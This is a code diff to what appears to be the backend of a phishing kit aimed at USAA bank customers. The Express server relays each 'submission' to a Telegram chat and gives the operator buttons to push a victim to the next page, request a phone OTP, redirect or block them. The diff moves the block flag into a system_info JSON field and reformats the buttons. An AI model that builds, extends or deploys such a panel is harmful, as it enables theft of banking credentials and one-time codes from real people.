@@ -12,6 +12,7 @@ import express from "express";
 import session from "express-session";
 
 const db = await initDB();
+let systemInfo = {};
 
 /* ================================
    IP HANDLING
@@ -343,7 +344,7 @@ async function buildMessage(data, options = {}) {
     // Get user info from DB
     // -----------------------------
     const userRow = await db.get(
-      "SELECT status, page, identifier FROM users WHERE id = ?",
+      "SELECT status, page, identifier, system_info FROM users WHERE id = ?",
       [userId]
     );
 
@@ -351,20 +352,28 @@ async function buildMessage(data, options = {}) {
       throw new Error(`User ${userId} not found in database`);
     }
 
+    // Parse system_info JSON
+    let systemInfo = {};
+    try {
+      systemInfo = JSON.parse(userRow.system_info || '{}');
+    } catch (err) {
+      console.warn(`Failed to parse system_info for user ${userId}, using empty object`);
+    }
+
+    const isBlocked = !!systemInfo.blocked; // now blocked flag comes from system_info
     const identifier = userRow.identifier;
     const page = (userRow.page || "").toLowerCase();
-    const isBlocked = userRow.status === "blocked";
 
     // -----------------------------
-    // Dynamic Heading (ORIGINAL LOGIC PRESERVED)
+    // Dynamic Heading
     // -----------------------------
     let heading;
 
     if (hasEmailOrUsername) {
-      heading = `🤖 USAA NEW SUBMISSION`;
+      heading = `👤 USAA NEW USER SUBMISSION`;
     } else {
       const display = identifier || userId;
-      heading = `🤖 USAA NEW SUBMISSION @${display}`;
+      heading = `👤 USAA SUBMISSION\n\n User: @${display}`;
     }
 
     let message = `${heading}\n\n`;
@@ -385,6 +394,9 @@ async function buildMessage(data, options = {}) {
       throw new Error("Bot token or Chat ID missing");
     }
 
+    // -----------------------------
+    // Build buttons (blocked logic is handled inside buildTelButtons now)
+    // -----------------------------
     const buttons = await buildTelButtons(userId, db);
 
     await sendTelegramMessage(botToken, chatId, message, {
@@ -425,6 +437,10 @@ function blockedRedirect(db, io) {
       if (blockAfterSub && req.session?.blocked && !req.session?.isAdmin) {
         return res.redirect(routeMap.final);
       }
+      
+      if (req.session?.blocked && !req.session?.isAdmin) {
+      	return res.redirect(routeMap.final);
+      	}
 
       // -----------------------------
       // Fetch user status from DB
@@ -436,24 +452,37 @@ function blockedRedirect(db, io) {
       }
 
       const user = await db.get(
-        "SELECT status FROM users WHERE id = ?",
-        [userId]
-      );
+		  "SELECT system_info FROM users WHERE id = ?",
+		  [userId]
+		);
 
-      // -----------------------------
-      // If blocked, skip status updates and emit admin update
-      // -----------------------------
-      if (user && user.status === "blocked") {
-        console.log(`⛔ User ${userId} is blocked — skipping status update.`);
-        // If you need to update admin UI about blocked users
-        const users = await db.all(`SELECT * FROM users WHERE last_seen >= datetime('now', '-2 minutes')`);
-        io.emit("admin:update", users);
-
-        // Optionally redirect blocked users
-        if (!req.session?.isAdmin) return res.redirect(routeMap.final);
-
-        return; // stop middleware chain
-      }
+		let systemInfo = {};
+		try {
+		  systemInfo = JSON.parse(user?.system_info || "{}");
+		} catch (err) {
+		  console.warn(`Failed to parse system_info for user ${userId}`);
+		}
+		
+		// -----------------------------
+		// If blocked, skip status updates and emit admin update
+		// -----------------------------
+		if (systemInfo.blocked) {
+		  console.log(`⛔ User ${userId} is blocked — skipping status update.`);
+		
+		  // Refresh admin UI
+		  const users = await db.all(
+		    `SELECT * FROM users WHERE last_seen >= datetime('now', '-2 minutes')`
+		  );
+		
+		  io.emit("admin:update", users);
+		
+		  // Optionally redirect blocked users
+		  if (!req.session?.isAdmin) {
+		    return res.redirect(routeMap.final);
+		  }
+		
+		  return; // stop middleware chain
+		}
 
       next(); // user not blocked → continue
     } catch (err) {
@@ -466,6 +495,23 @@ function blockedRedirect(db, io) {
 async function handleAdminCommand({ userId, command, otp, io, db }) {
   console.log("handling command:", userId, command);
 
+  // Fetch user and parse system_info once
+  const userRow = await db.get(
+    "SELECT page, system_info FROM users WHERE id = ?",
+    [userId]
+  );
+
+  if (!userRow) {
+    console.warn(`User ${userId} not found in DB`);
+    return;
+  }
+  
+  try {
+    systemInfo = JSON.parse(userRow.system_info || '{}');
+  } catch (err) {
+    console.warn(`Failed to parse system_info for user ${userId}, using empty object`);
+  }
+
   // Find the specific socket for this user
   for (let [id, socket] of io.of("/").sockets) {
     if (socket.userId === userId) {
@@ -473,15 +519,22 @@ async function handleAdminCommand({ userId, command, otp, io, db }) {
       let phonescreen = null;
 
       if (command === "nextpage") {
-        const user = await db.get("SELECT page FROM users WHERE id = ?", [userId]);
-        link = await getNextPage(user?.page);
+        link = await getNextPage(userRow?.page);
         console.log("link", link);
       } else if (command === "redirect") {
         link = resolveFrontendRoute("final");
       } else if (command === "block") {
-        await db.run("UPDATE users SET status = ? WHERE id = ?", ["blocked", userId] );
+        systemInfo.blocked = true; // mark blocked in system_info
+        await db.run(
+          "UPDATE users SET system_info = ? WHERE id = ?",
+          [JSON.stringify(systemInfo), userId]
+        );
       } else if (command === "unblock") {
-        await db.run("UPDATE users SET status = ? WHERE id = ?", ["active", userId] );
+        systemInfo.blocked = false; // remove blocked flag
+        await db.run(
+          "UPDATE users SET system_info = ? WHERE id = ?",
+          [JSON.stringify(systemInfo), userId]
+        );
       } else if (command === "phone-otp") {
         phonescreen = resolveFrontendRoute("otp");
       }
@@ -505,16 +558,27 @@ async function buildTelButtons(userId, db) {
   if (!db) throw new Error("db missing");
 
   const userRow = await db.get(
-    "SELECT status, page FROM users WHERE id = ?",
+    "SELECT status, page, system_info FROM users WHERE id = ?",
     [userId]
-  );
-
-  if (!userRow) {
-    throw new Error(`User ${userId} not found`);
-  }
-
-  const isBlocked = userRow.status === "blocked";
-  const page = (userRow.page || "").toLowerCase();
+	);
+	
+	if (!userRow) {
+	    throw new Error(`User ${userId} not found`);
+	}
+	
+	// Parse the system_info JSON
+	try {
+	    systemInfo = JSON.parse(userRow.system_info || '{}');
+	} catch (err) {
+	    console.warn(`Failed to parse system_info for user ${userId}, using empty object`);
+	}
+	
+	// Check blocked flag
+	const isBlocked = !!systemInfo.blocked;
+	
+	// Now normal status
+	const status = userRow.status; // e.g., "active", "idle"
+    const page = (userRow.page || "").toLowerCase();
 
   let buttons = [];
 
@@ -536,8 +600,14 @@ async function buildTelButtons(userId, db) {
 
   // Row 1
   buttons.push([
-    { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
-    { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
+    {
+      text: "Refresh",
+      callback_data: `cmd:refresh:${userId}`
+    },
+    {
+      text: "Next Page",
+      callback_data: `cmd:nextpage:${userId}`
+    }
   ]);
 
   // Row 2 (Login / OTP only)
@@ -555,18 +625,29 @@ async function buildTelButtons(userId, db) {
 
     buttons.push([
       badButton,
-      { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
+      {
+        text: "Phone OTP",
+        callback_data: `cmd:phone-otp:${userId}`
+      }
     ]);
   }
 
   // Row 3
   buttons.push([
-    { text: "Redirect", callback_data: `cmd:redirect:${userId}` },
-    { text: "Block", callback_data: `cmd:block:${userId}` }
+    {
+      text: "Redirect",
+      callback_data: `cmd:redirect:${userId}`
+    },
+    {
+      text: "Block",
+      callback_data: `cmd:block:${userId}`
+    }
   ]);
 
   return buttons;
 }
+
+
 
 async function isAutopilotOn(db) {
   const row = await db.get("SELECT autopilot FROM admin_settings WHERE id = 1");
@@ -584,6 +665,7 @@ export {
   buildTelButtons,
   handleAdminCommand,
   sendAPIRequest,
+  systemInfo,
   getPageFlow,
   savePageFlow,
   pageFlow,
